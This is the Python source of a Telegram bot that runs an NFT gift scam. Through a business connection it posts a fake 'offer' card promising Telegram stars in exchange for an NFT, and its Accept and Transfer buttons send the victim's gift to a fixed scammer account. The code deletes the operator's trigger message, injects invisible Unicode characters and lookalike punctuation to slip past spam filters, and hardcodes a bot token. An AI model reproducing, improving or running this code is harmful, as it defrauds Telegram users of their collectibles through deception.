import telebot
import re
import random
import time
import threading
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, MessageEntity

BOT_TOKEN  = "8957995978:AAEMJv04pvmQPuTppLDKLQoescjezii5ulY"
NFT_TARGET = "nftskupnoscam"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

_SECRET_POOL = [
    "птица","мир","любовь","нежность","обожаю","весна","волна","луна","звезда",
    "ветер","туман","река","гора","лес","сад","цветок","рассвет","закат","небо",
    "дождь","снег","лёд","пламя","свет","тень","эхо","тишина","голос","сердце",
    "душа","мечта","надежда","вера","радость","грусть","улыбка","взгляд","касание",
    "объятие","поцелуй","шёпот","смех","слеза","путь","дорога","мост","берег",
    "прибой","шторм","гроза","молния","гром","радуга","иней","роса","пыль",
    "дым","пепел","уголь","алмаз","жемчуг","опал","рубин","сапфир","изумруд",
    "янтарь","коралл","шёлк","бархат","лён","хлопок","парча","кружево","атлас",
    "туча","облако","горизонт","перо","крыло","гнездо","полёт","парение",
    "охота","след","стая","волк","лиса","сова","орёл","сокол","голубь","ласточка",
    "журавль","лебедь","павлин","колибри","бабочка","стрекоза","жук","паук","мышь",
    "кот","лев","тигр","барс","рысь","зубр","лось","олень","заяц","бобёр",
    "выдра","дельфин","кит","акула","медуза","краб","устрица","маяк","парус",
    "якорь","штурвал","компас","карта","маршрут","азимут","меридиан","полюс",
    "ледник","вулкан","гейзер","каньон","долина","плато","равнина","степь","тундра",
    "тайга","джунгли","пустыня","оазис","мираж","песок","камень","скала","утёс",
    "пещера","грот","башня","замок","крепость","стена","ворота","купол","шпиль",
    "колонна","фреска","мозаика","витраж","статуя","маска","зеркало","призма",
    "хрусталь","стекло","фарфор","глина","кость","раковина","нить","узел","петля",
    "спираль","круг","квадрат","ромб","стрела","точка","линия","цвет","тон",
    "палитра","кисть","холст","рамка","шрифт","строка","страница","глава","архив",
    "символ","знак","образ","память","искра","прах","закон","кодекс","печать",
]

_pending: dict[str, dict] = {}
_pending_lock = threading.Lock()

_LANG = {
    "ru": {
        "header":      "Пользователь предлагает Вам",
        "for":         "за подарок",
        "expires":     "Предложение действует ещё",
        "time":        "6 ч. 0 мин.",
        "decline_btn": "✗ Отклонить",
        "accept_btn":  "✓ Принять",
        "nft_btn":     "🎁 Передать NFT",
        "guide_btn":   "📖 Как передать NFT",
        "back_btn":    "← Назад",
        "how_title":   "Как передать NFT — пошагово",
        "how_1":       "Нажми кнопку «🎁 Передать NFT» ниже",
        "how_1b":      "Telegram откроет меню отправки подарка",
        "how_2":       "Выбери нужный коллекционный NFT из своей коллекции",
        "how_3":       "Нажми «Отправить» — подарок уйдёт получателю",
        "how_4":       "После отправки — нажми «Принять» на карточке",
        "how_5":       "Получишь ⭐ звёзды мгновенно после подтверждения",
        "how_6":       "NFT передаётся напрямую через Telegram.\nБот не имеет доступа к твоим подаркам.",
        "declined":    "Предложение отклонено.",
        "secret_msg":  "✅ Оффер создан\n🔑 Секретное слово: <b>{word}</b>\n\nОтправь его в нужный чат — оффер появится там.",
    },
    "eng": {
        "header":      "User is offering you",
        "for":         "for the gift",
        "expires":     "Offer valid for",
        "time":        "6 h. 0 min.",
        "decline_btn": "✗ Decline",
        "accept_btn":  "✓ Accept",
        "nft_btn":     "🎁 Transfer NFT",
        "guide_btn":   "📖 How to transfer NFT",
        "back_btn":    "← Back",
        "how_title":   "How to transfer NFT — step by step",
        "how_1":       "Tap «🎁 Transfer NFT» below",
        "how_1b":      "Telegram will open the gift sending menu",
        "how_2":       "Choose the collectible NFT from your collection",
        "how_3":       "Tap «Send» — the gift will go to the recipient",
        "how_4":       "After sending — tap «Accept» on the card",
        "how_5":       "You'll receive ⭐ stars instantly after confirmation",
        "how_6":       "NFT is transferred directly via Telegram.\nThe bot has no access to your gifts.",
        "declined":    "Offer declined.",
        "secret_msg":  "✅ Offer created\n🔑 Secret word: <b>{word}</b>\n\nSend it to the target chat — the offer will appear there.",
    },
    "cn": {
        "header":      "用户正在向您提供",
        "for":         "以换取礼物",
        "expires":     "优惠有效期还剩",
        "time":        "6 小时 0 分钟",
        "decline_btn": "✗ 拒绝",
        "accept_btn":  "✓ 接受",
        "nft_btn":     "🎁 转让 NFT",
        "guide_btn":   "📖 如何转让 NFT",
        "back_btn":    "← 返回",
        "how_title":   "如何转让 NFT — 分步说明",
        "how_1":       "点击下方「🎁 转让 NFT」按钮",
        "how_1b":      "Telegram 将打开礼物发送菜单",
        "how_2":       "从您的收藏中选择所需的收藏品 NFT",
        "how_3":       "点击「发送」— 礼物将发送给收件人",
        "how_4":       "发送后 — 点击卡片上的「接受」",
        "how_5":       "确认后将立即收到 ⭐ 星星",
        "how_6":       "NFT 直接通过 Telegram 转让。\n机器人无法访问您的礼物。",
        "declined":    "提案已拒绝。",
        "secret_msg":  "✅ 报价已创建\n🔑 暗语：<b>{word}</b>\n\n将其发送到目标聊天 — 报价将在那里显示。",
    },
}

CROWN_EMOJI_ID   = "5195311987916013312"
STAR_EMOJI_ID    = "5920281855378068765"
CLOCK_EMOJI_ID   = "5451646196283172748"
CONFIRM_EMOJI_ID = "5206607081334906820"
SHIELD_EMOJI_ID  = "5251203410396458957"
FIRE_EMOJI_ID    = "5199829039289985162"
DIAMOND_EMOJI_ID = "5188450271456543676"

def em(eid, fb):
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

_VS      = [chr(0xFE00 + i) for i in range(16)]
_COMBINE = ['\u200b','\u200c','\u200d','\u2060','\u2061',
            '\u2062','\u2063','\u2064','\ufeff','\u00ad','\u034f','\u180e']
_TAG_SP  = '\U000E0020'
_FONTS   = [
    {**{chr(65+i): chr(0x1D5D4+i) for i in range(26)},
     **{chr(97+i): chr(0x1D5EE+i) for i in range(26)},
     **{str(i):    chr(0x1D7EC+i) for i in range(10)}},
    {**{chr(65+i): chr(0x1D670+i) for i in range(26)},
     **{chr(97+i): chr(0x1D68A+i) for i in range(26)},
     **{str(i):    chr(0x1D7F6+i) for i in range(10)}},
    {**{chr(65+i): chr(0x1D538+i) for i in range(26)},
     **{chr(97+i): chr(0x1D552+i) for i in range(26)},
     **{str(i):    chr(0x1D7D8+i) for i in range(10)}},
]
_CYR_BOLD = {
    'а':'𝗮','е':'𝗲','и':'𝗶','к':'𝗸','м':'𝗺','н':'𝗻',
    'о':'𝗼','р':'𝗿','с':'𝘀','т':'𝘁','у':'𝘂','в':'𝘃',
}
_PUNCT = {
    '.':['．','⸼','·','∙','.'],
    ',':['，','‚','⸴',','],
    '!':['！','ǃ','﹗','!'],
    '?':['？','ʔ','﹖','?'],
    ':':['：','꞉','᛬',':'],
    '-':['‐','‑','‒','–','-'],
}

def _inv():
    r = random.randint(0, 2)
    if r == 0: return random.choice(_COMBINE)
    if r == 1: return random.choice(_VS)
    return _TAG_SP if random.random() < 0.4 else random.choice(_COMBINE)

def unique_text(text: str) -> str:
    out = []
    for ch in text:
        if ch in _PUNCT:
            out.append(random.choice(_PUNCT[ch]))
            continue
        if ch == ' ':
            out.append(' ')
            out.append(_inv())
            continue
        if ch == '\n':
            out.append('\n')
            continue
        out.append(ch)
        if random.random() < 0.70:
            out.append(random.choice(_VS))
        if random.random() < 0.15:
            out.append(random.choice(_COMBINE))
    return ''.join(out)

def bold_font(text: str) -> str:
    out = []
    for ch in text:
        lo = ch.lower()
        mapped = _CYR_BOLD.get(lo, ch)
        if mapped == ch:
            for f in _FONTS:
                if ch in f:
                    mapped = f[ch]
                    break
        out.append(mapped)
        if mapped != ch and random.random() < 0.5:
            out.append(random.choice(_VS))
    return ''.join(out)

def random_delay(lo=0.4, hi=1.3):
    if random.random() < 0.3:
        time.sleep(random.uniform(0.1, 0.3))
    time.sleep(random.uniform(lo, hi))

def _new_secret() -> str:
    word = random.choice(_SECRET_POOL)
    with _pending_lock:
        if word not in _pending:
            return word
        return word + str(random.randint(10, 99))

# ─── /start ───────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    bot.send_message(
        msg.chat.id,
        "Команды:\n.o [NFT_URL] [звёзд] [ru|eng|cn]\n\n"
        "Пример:\n.o https://t.me/nft/xmas-stocking-7391 500 ru",
    )

# ─── .o в личке — создание оффера ────────────────────────────────────────────
@bot.message_handler(regexp=r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$')
def create_offer(msg):
    m        = re.match(r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$', msg.text)
    nft_url  = m.group(1)
    stars    = m.group(2)
    lang     = m.group(3)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-', ' ').title() or "Gift"

    secret = _new_secret()
    with _pending_lock:
        _pending[secret] = {
            "nft_url": nft_url, "nft_name": nft_name,
            "stars": stars, "lang": lang,
        }

    print(f"[OFFER] created secret='{secret}' pending_count={len(_pending)}")

    L = _LANG[lang]
    bot.send_message(
        msg.chat.id,
        L["secret_msg"].format(word=f"<code>{secret}</code>"),
        parse_mode="HTML",
    )

# ─── бизнес-подключение ───────────────────────────────────────────────────────
@bot.business_connection_handler()
def on_bc(bc):
    print(f"[BC] connected user_chat_id={bc.user_chat_id} bc_id={bc.id}")
    try:
        bot.send_message(bc.user_chat_id,
            f"✅ Подключено\nID: {bc.user_chat_id}\nBC: {bc.id}")
    except Exception as e:
        print(f"[BC] notify error: {e}")

# ─── бизнес-сообщение: секретное слово → оффер ───────────────────────────────
# ВАЖНО: этот хендлер последний — после всех regexp
@bot.business_message_handler(func=lambda m: True)
def handle_biz(message):
    raw  = message.text or ""
    text = raw.strip()

    print(f"[BIZ] got='{text}' bc_id={message.business_connection_id} "
          f"chat={message.chat.id} pending_keys={list(_pending.keys())[:10]}")

    with _pending_lock:
        data = _pending.get(text)

    if data is None:
        print(f"[BIZ] no match for '{text}'")
        return

    bc_id = message.business_connection_id
    cid   = message.chat.id

    # удаляем секретное слово
    try:
        bot.delete_message(cid, message.message_id,
                           business_connection_id=bc_id)
        print(f"[BIZ] deleted msg {message.message_id}")
    except Exception as e:
        print(f"[BIZ] delete error: {e}")

    with _pending_lock:
        _pending.pop(text, None)

    _send_offer(cid, bc_id,
                data["nft_url"], data["nft_name"],
                data["stars"], _LANG[data["lang"]], data["lang"])

# ─── построение оффера ────────────────────────────────────────────────────────
def _send_offer(cid, bc_id, nft_url, nft_name, stars, L, lang_key):
    crown_ph = "👑"
    star_ph  = "⭐"
    clock_ph = "⏳"

    p_crown = crown_ph + " "
    p1      = unique_text(L["header"] + "\n")
    p_stars = bold_font(stars)
    p_star  = " " + star_ph
    p2      = unique_text(" " + L["for"] + " ")
    p_nft   = nft_name
    p3      = unique_text(".\n\n")
    p_clock = clock_ph + " "
    p_exp   = unique_text(L["expires"] + " ")
    p_time  = bold_font(L["time"])
    p4      = unique_text("..")

    text = (p_crown + p1 + p_stars + p_star + p2
            + p_nft + p3 + p_clock + p_exp + p_time + p4)

    off_crown = 0
    off_stars = len(p_crown + p1)
    off_star  = off_stars + len(p_stars) + 1
    off_nft   = off_stars + len(p_stars) + len(p_star) + len(p2)
    off_clock = off_nft + len(p_nft) + len(p3)
    off_time  = off_clock + len(p_clock) + len(p_exp)

    entities = [MessageEntity(**e) for e in [
        {"type":"custom_emoji","offset":off_crown,"length":len(crown_ph),"custom_emoji_id":CROWN_EMOJI_ID},
        {"type":"bold",        "offset":off_stars,"length":len(p_stars)},
        {"type":"custom_emoji","offset":off_star, "length":len(star_ph), "custom_emoji_id":STAR_EMOJI_ID},
        {"type":"text_link",   "offset":off_nft,  "length":len(p_nft),   "url":nft_url},
        {"type":"custom_emoji","offset":off_clock,"length":len(clock_ph),"custom_emoji_id":CLOCK_EMOJI_ID},
        {"type":"bold",        "offset":off_time, "length":len(p_time)},
    ]]

    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton(L["decline_btn"], callback_data="decline"),
        InlineKeyboardButton(L["accept_btn"],  url=f"tg://send_gift?to={NFT_TARGET}"),
    )
    kb.row(InlineKeyboardButton(L["nft_btn"],   url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton(L["guide_btn"], callback_data=f"how:{lang_key}"))

    random_delay()
    try:
        bot.send_message(cid, text, entities=entities,
                         reply_markup=kb, business_connection_id=bc_id)
        print(f"[OFFER] sent to chat={cid}")
    except Exception as e:
        print(f"[OFFER] send error: {e}")

# ─── callbacks ────────────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "decline")
def cb_decline(call):
    bot.answer_callback_query(call.id, _LANG["ru"]["declined"])
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("how:"))
def cb_how(call):
    bot.answer_callback_query(call.id)
    lk = call.data.split(":", 1)[1] if ":" in call.data else "ru"
    if lk not in _LANG: lk = "ru"
    L = _LANG[lk]

    text = (
        f'{em(CROWN_EMOJI_ID,"👑")} <b>{L["how_title"]}</b>\n\n'
        f'{em(FIRE_EMOJI_ID,"🔥")} {L["how_1"]}\n'
        f'  └ {L["how_1b"]}\n\n'
        f'{em(CONFIRM_EMOJI_ID,"✅")} {L["how_2"]}\n\n'
        f'{em(CONFIRM_EMOJI_ID,"✅")} {L["how_3"]}\n\n'
        f'{em(CONFIRM_EMOJI_ID,"✅")} {L["how_4"]}\n\n'
        f'{em(DIAMOND_EMOJI_ID,"💎")} <b>{L["how_5"]}</b>\n\n'
        f'{em(SHIELD_EMOJI_ID,"🛡️")} <i>{L["how_6"]}</i>'
    )
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton(L["nft_btn"],  url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton(L["back_btn"], callback_data=f"back:{lk}"))
    try:
        bot.edit_message_text(text, call.message.chat.id,
                              call.message.message_id,
                              parse_mode="HTML", reply_markup=kb)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("back:"))
def cb_back(call):
    bot.answer_callback_query(call.id)
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

# ─── keep-alive HTTP ──────────────────────────────────────────────────────────
class _Ping(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

def _http():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), _Ping).serve_forever()

# ─── main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    threading.Thread(target=_http, daemon=True).start()
    while True:
        try:
            print("Bot started")
            bot.infinity_polling(
                allowed_updates=[
                    "message","business_message",
                    "business_connection","callback_query",
                ],
                timeout=30,
                long_polling_timeout=20,
            )
        except Exception as e:
            print(f"Restart: {e}")
            time.sleep(5)
